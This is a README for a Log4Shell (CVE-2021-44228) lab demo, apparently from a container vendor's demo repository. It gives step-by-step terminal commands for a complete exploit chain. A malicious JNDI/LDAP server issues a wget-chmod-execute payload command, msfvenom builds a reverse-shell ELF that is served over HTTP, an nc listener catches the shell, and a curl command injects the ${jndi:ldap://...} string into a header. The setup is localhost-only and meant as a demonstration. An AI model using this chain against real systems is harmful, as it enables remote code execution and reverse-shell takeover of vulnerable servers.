# Explanation of Log4Shell Attack
https://securityboulevard.com/2021/12/log4shell-jndi-injection-via-attackable-log4j/

# log4j km-demo

[https://www.reposhub.com/java/web-frameworks/twseptian-Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab.html](https://www.reposhub.com/java/web-frameworks/twseptian-Spring-Boot-Log4j-CVE-2021-44228-Docker-Lab.html)

- ensure that JDK 11 and Maven are installed prior to this

**clone:**

```bash
# steps to checkout
$ git clone https://github.com/kontainapp/km-demo.git
$ cd km-demo

$ git submodule update --init --recursive
$ git fetch origin

$ git checkout -t origin/sm/demo_log4jshell

# 1-liner
# git clone https://github.com/kontainapp/km-demo.git && cd km-demo && git submodule update --init --recursive && git fetch origin && git checkout -t origin/sm/demo_log4jshell
```

### **Build**

```bash
# build
$ cd km-demo/log4j/
$ make demo
```

### **Terminal 1 (Malicious LDAP server):**

```bash
# T1 - Malicious LDAP Server triggers "wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf"
$ cd km-demo/log4j/JNDI-Exploit-Kit/

# run with docker
$ docker run --network=host --rm log4jshell/jndi_exploit_kit**

OR

$ cd scripts
$ ./t1LdapJNDIExploit.sh

OR

# java jar based run - but could be jdk version issue
$ java -jar ./target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf"
...
... wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf
...
Target environment(Build in JDK 1.6 whose trustURLCodebase is true):
**rmi://10.100.101.100:1099/7p5qra
ldap://10.100.101.100:1389/7p5qra

```

### **Terminal 2 (Victim)**:

the vulnerable log4j application

```bash
# T2 - Spring Boot Application Victim that contains a logging line that logs the header with the malicious LDAP string
# runs "java -jar ./target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar" in docker for ease of use
cd km-demo/log4j/
docker run --rm --network=host vulnerable-app
...

OR

# map /tmp to docker else it cant start as it gives error saying can't writeto /tmp
docker run --rm --runtime=krun --network=host -v /tmp:/tmp log4jshell/vulnerable-app-kontain

OR

OR RUN with:
$ ./t2-vulnerable-app.sh
```

### Terminal 3

We use metasploit framework to create the dial back code and HTTP host on port 8081. The command line to create it is:

dial back (`rev.elf`) server (Terminal 3)

```bash

# T3 - Malware server that contains exploits like creating a reverse shell to hackers computer
$ cd km-demo/log4j/

$ cat msfvenom.sh
docker run --name=msfvenom log4jshell/msfvenom
docker cp msfvenom:/tmp/rev.elf /tmp/rev.elf
cd /tmp
python3 -m http.server 8082

$ sh ./msfvenom.sh

OR (without docker)

cd dev/kontain/km-demo/log4j/
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/rev.elf
cd /tmp/
python3 -m http.server 8082

OR

$ ./t3msfvenom.sh
```

### Terminal 4

ncat receiving dialback

```bash
# T4 - Reverse Shell Listening Server
nc -l 4444
nc -lvnp 4444

OR

./t4nc.sh
```

### Terminal 5

Attacking curl command

Again there is no special code, we just use curl with the LDAP end point from above encoded:

```bash
# T5 - Attack curl command with malicious LDAP string in header for victim to log
curl 127.0.0.2:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/xqinla}'

# to see
$ cat t5attackcurl.sh
```
